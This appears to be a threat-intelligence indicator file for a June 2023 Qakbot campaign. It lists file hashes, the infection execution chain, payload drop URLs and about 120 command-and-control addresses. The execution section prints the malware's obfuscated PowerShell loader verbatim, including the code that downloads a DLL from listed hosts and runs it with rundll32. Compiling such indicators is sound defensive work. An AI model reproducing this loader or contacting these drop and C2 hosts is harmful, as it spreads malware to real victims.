@@ -1,0 +1,189 @@
+21.06.2023 | Qakbot | obama270 | Campaign 1687338804 | Version 404.1382
+
+*************************************************
+
+.pdf f0b654f596370f6f8d1ae182c6913a5f2e5d280c7d3ca8ba9e8b5fe50dc8f4b7
+.zip 77378f10b312ec4ce3a745b20b4361cc2cdec78a33d77895a643bad81b53d406
+.js 437a069aa1009af7d4d4303b75ed0fb7a18052ebb484f6e913332c328e8c91f7
+.dll 2522d0f21e2e5ec8c166e867e8193949086d3ddb19fc1a42fc46e02270f5cfee
+
+*************************************************
+
+Exec >
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\RrwuRcLSk2Zx.js
+
+powershell.exe" -encodedcommand powershell.exe " -encodedcommand $ReswearingLibinit = "
+aAB0AHQAcABzADoALwAvAHAAcgBvAHMAYQBiAGIAYQB0AGkAYwBhAGwALgBmAG0AkpaAB0AHQAcAA6AC8ALwA5ADkALgAxADUANgAuADIANQAyAC4AMgAxADkA ";$ladersPelves = "
+aAB0AHQAcAA6AC8ALwAyADUAMQAuADIAMQAyAC4AOQAxAC4AOQA5AA == C = aAB0AHQAcAA6AC8ALwBDAGwAaQBtAGEAdABvAGwAbwBnAGkAYwBhAGwAbAB5AFIAZQBwAG8AaQBuAHQALgBkAGkAYQBtAG8AbgBkAHMAC = aAB0AHQAcAA6AC8ALwAyADMAOQAuADUAMAAuADIAMAAzAC4AMgAyADgA ";$ladyless = 65844;$breadbasketBlathery = "
+https: //68.99.115.56/EePmD/u
+    https: //HypocriticallyUnmortise.tw/D9Yp7/PetQ
+    https: //227.253.134.95/98/PS
+    https: //wersika.com/mDy634QV8.dat
+    https: //waeaosu.com/xriZnQCso6YS.dat
+    https: //citarfas.com/xk1haRU2f.dat
+    https: //viltare.com/PlI6qXoN.dat
+    https: //bingalos.com/u0kwdiTOTAs1.dat
+    https: //motrawer.com/XQO3nF8.dat
+    http: //114.212.53.202
+    http: //PodzolicAzothionium.br";foreach ($CrusherRetranslation in $breadbasketBlathery -split "_") {$Weddinger = "aAB0AHQAcAA6AC8ALwA1ADQALgAyADQANgAuADUAMwAuADUAMQA=";$CarbolxylolCertificatory = "aAB0AHQAcAA6AC8ALwBXAGEAYwBoAG4AYQBFAHQAaQBvAGwAbwBnAGkAZQBzAC4AdQBuAGkAdgBlAHIAcwBpAHQAeQA=NkZIaAB0AHQAcAA6AC8ALwA4ADEALgAxADUAOAAuADQAOAAuADEAMAAxAA==NkZIaAB0AHQAcABzADoALwAvADEANgA1AC4AMQAxADEALgAxADUANAAuADYAOAA=NkZIaAB0AHQAcABzADoALwAvAEgAZQB0AGUAcgBvAGMAbABpAHQAbwB1AHMALgBuAGEAdgB5AA==";try {$InchedIntreating = "aAB0AHQAcABzADoALwAvAEMAYQBsAGkAYwB1AGwAYQB0AGUALgBlAHUAyaAB0AHQAcABzADoALwAvADEANQA4AC4AMQA0ADAALgAxADcAMwAuADQAOAA=";$ParasphenoidFeverweed = "aAB0AHQAcAA6AC8ALwAxADgAMAAuADkAOAAuADEANgA2AC4AMgA0ADgAXjwaAB0AHQAcAA6AC8ALwBKAGUAZQB0AGUAZQBFAG0AcAByAG8AcwB0AGgAbwB0AG8AbgBvAHMALgBpAG4AcwB0AGkAdAB1AHQAZQA=";$AcrospiredDiphyllous = $CrusherRetranslation;$interrupt = "UABpAG4AbgBhAC4AZABsAGwA";$Medioventral = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($AcrospiredDiphyllous));$cobbin = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($interrupt));md C:\\ProgramData\\SNWSPinna;Invoke-WebRequest $Medioventral -O C:\\ProgramData\\SNWSPinna\\$cobbin;$InchedIntreating = "aAB0AHQAcABzADoALwAvAEMAYQBsAGkAYwB1AGwAYQB0AGUALgBlAHUAyaAB0AHQAcABzADoALwAvADEANQA4AC4AMQA0ADAALgAxADcAMwAuADQAOAA=";$ParasphenoidFeverweed = "aAB0AHQAcAA6AC8ALwAxADgAMAAuADkAOAAuADEANgA2AC4AMgA0ADgAXjwaAB0AHQAcAA6AC8ALwBKAGUAZQB0AGUAZQBFAG0AcAByAG8AcwB0AGgAbwB0AG8AbgBvAHMALgBpAG4AcwB0AGkAdAB1AHQAZQA=";$SeroprophylaxisCommoderate = (Get-Item -Path C:\\ProgramData\\SNWSPinna\\$cobbin).Length;$Tollpenny = "aAB0AHQAcAA6AC8ALwAyADEAOAAuADEANQA5AC4AMQAzADkALgAxADYANgA=AOaAB0AHQAcABzADoALwAvADEANgAzAC4AOAAyAC4AMQAzADEALgAyADAAOAA=AOaAB0AHQAcABzADoALwAvAHMAaABhAG0AYQBuAHMALgBpAG4AdgBlAHMAdABtAGUAbgB0AHMAAOaAB0AHQAcAA6AC8ALwBUAGUAdABhAG4AaQBnAGUAbgBvAHUAcwBFAG4AaQBnAG0AYQB0AGkAcwB0AC4AaABuAA==";$Algidity = "aAB0AHQAcAA6AC8ALwBwAGEAcgBvAHUAcwBHAGEAbABpAG8AbgBqAGkALgBjAG4AraAB0AHQAcAA6AC8ALwAxADEAMwAuADUAMwAuADYANwAuADEAOQA1AA==";if ($SeroprophylaxisCommoderate -ge $ladyless){$unforgivably = "aAB0AHQAcAA6AC8ALwA4ADQALgAxADUAMQAuADEANAA4AC4AMQAyADAABraAB0AHQAcAA6AC8ALwAxADQAMQAuADUANwAuADEAMgA2AC4AOAA2AA==";powershell -encodedcommand "$phyllocerasRepaginates = "ParcelingDytiscus";$automatonlikeApatheia = "IgnicolistBronchostomy";cmd /c rundll32 C:\ProgramData\SNWSPinna\Pinna.dll,more;$MollitiousBrachiofaciolingual = "ProctoplasticAsunder";$ClowrePlaymaking = "ThieverTelescope";=";$Unburglarized = "aAB0AHQAcAA6AC8ALwBSAGUAcwBlAG0AaQBuAGEAdABlAC4AcwBvAGYAdAB3AGEAcgBlAA==maAB0AHQAcABzADoALwAvADQAOAAuADIAMQAyAC4AMQAyADIALgAxADcANwA=";break;} else {}} catch {}}
+
+powershell.exe -encodedcommand $phyllocerasRepaginates = "ParcelingDytiscus";$automatonlikeApatheia = "IgnicolistBronchostomy";cmd /c rundll32 C:\ProgramData\SNWSPinna\Pinna.dll,more;$MollitiousBrachiofaciolingual = "ProctoplasticAsunder";$ClowrePlaymaking = "ThieverTelescope";=
+
+cmd.exe /c rundll32 C:\ProgramData\SNWSPinna\Pinna.dll,more
+
+rundll32 C:\ProgramData\SNWSPinna\Pinna.dll,more
+
+wermgr.exe
+
+*************************************************
+
+zip drop urls:
+
+http://charlottepajamass.com/yxxqvysjsx/vodka.gif
+http://damnproudtobe.info/anhlgenbrs/vodka.gif
+http://dgmsoft.com.tr/pmaaxnluqn/vodka.gif
+http://doanlienhiep.vn/jtgyyassoz/vodka.gif
+http://jynacademy.com/anlhdovxxp/vodka.gif
+http://lab4cash.cl/xisqnhynwe/vodka.gif
+https://ashokudhayan.com/jpdsvtreny/vodka.gif
+https://corladcajamarca.org/ivsiccoxyn/vodka.gif
+https://kitesconsulting.us/ohfcbneuel/vodka.gif
+https://marwatsllc.com/fmupdburcg/vodka.gif
+https://nexoitsolution.com/hijhavxoqr/vodka.gif
+https://thestreamresort.in/whhhpivtfu/vodka.gif
+https://urbankrafted.com/gbfeelrdpm/vodka.gif
+https://vaillartservis.com.tr/yqhenvbvjg/vodka.gif
+https://yoursellersbuddy.com/tgqczqrshv/vodka.gif
+
+.dll drop urls
+
+https://wersika.com/mDy634QV8.dat
+https://waeaosu.com/xriZnQCso6YS.dat
+https://citarfas.com/xk1haRU2f.dat
+https://viltare.com/PlI6qXoN.dat
+https://bingalos.com/u0kwdiTOTAs1.dat
+https://motrawer.com/XQO3nF8.dat
+
+*************************************************
+
+c2's
+
+91.160.70.68:32100
+182.75.189.42:995
+151.62.196.183:443
+72.134.124.16:443
+104.35.24.154:443
+84.215.202.8:443
+71.31.9.226:995
+103.153.180.59:995
+45.62.75.217:443
+95.230.110.222:995
+49.175.72.81:443
+12.172.173.82:22
+168.149.47.12:443
+68.186.65.132:443
+113.11.92.30:443
+116.75.58.218:443
+151.69.32.238:443
+24.138.87.122:995
+96.87.28.170:2222
+147.147.30.126:2222
+109.105.29.93:443
+183.82.107.190:443
+1.221.179.74:443
+2.36.64.159:2078
+12.172.173.82:995
+201.171.159.196:443
+192.252.166.24:80
+176.44.123.169:995
+2.82.8.80:443
+81.150.169.174:2083
+74.12.147.68:2222
+86.248.228.57:2078
+70.160.67.203:443
+75.109.111.89:443
+88.126.94.4:50000
+70.28.50.223:3389
+223.166.13.95:995
+162.248.14.107:443
+70.28.50.223:32100
+84.35.26.14:995
+183.87.163.165:443
+92.186.69.229:2222
+12.172.173.82:993
+174.4.89.3:443
+199.27.66.213:443
+12.172.173.82:50001
+81.229.117.95:2222
+92.9.45.20:2222
+12.172.173.82:20
+91.169.12.198:32100
+213.91.235.146:443
+12.172.173.82:465
+70.28.50.223:2078
+75.98.154.19:443
+136.232.179.26:443
+67.87.119.216:2078
+103.123.223.131:443
+94.204.121.72:443
+103.140.174.20:2222
+95.45.50.93:2222
+72.4.96.62:443
+176.142.207.63:443
+213.64.33.92:2222
+47.34.30.133:443
+70.28.50.223:2087
+47.205.25.170:443
+81.150.169.174:2078
+81.150.169.174:2087
+89.158.150.253:443
+66.241.183.99:443
+188.28.22.221:443
+23.234.237.3:443
+181.230.169.180:443
+184.182.66.109:443
+70.28.50.223:2083
+175.156.65.126:2222
+64.229.117.208:2222
+77.126.99.230:443
+87.252.106.235:995
+12.172.173.82:32101
+161.142.100.114:995
+24.234.220.88:995
+70.28.50.223:1194
+24.234.80.122:995
+81.150.169.174:2222
+121.121.100.202:995
+105.186.138.229:995
+27.0.48.233:443
+80.6.50.34:443
+12.172.173.82:21
+197.3.227.63:443
+68.6.237.243:443
+87.149.116.32:995
+103.212.19.254:995
+90.104.151.37:2222
+178.175.187.254:443
+86.170.169.53:443
+119.82.71.94:2078
+90.7.72.46:2222
+217.165.255.105:443
+116.88.76.28:443
+125.99.69.177:443
+73.155.10.79:443
+103.141.50.46:995
+142.181.206.222:2222
+47.199.241.39:443
+96.255.66.51:995
+64.121.161.102:443
+60.189.130.84:995
+187.199.244.117:32103
+110.159.115.244:443
+72.205.104.134:443
+12.172.173.82:2087
+79.168.224.165:2222
+81.157.120.247:443
+124.122.47.219:443
+201.227.113.134:2222
+103.144.201.52:2078
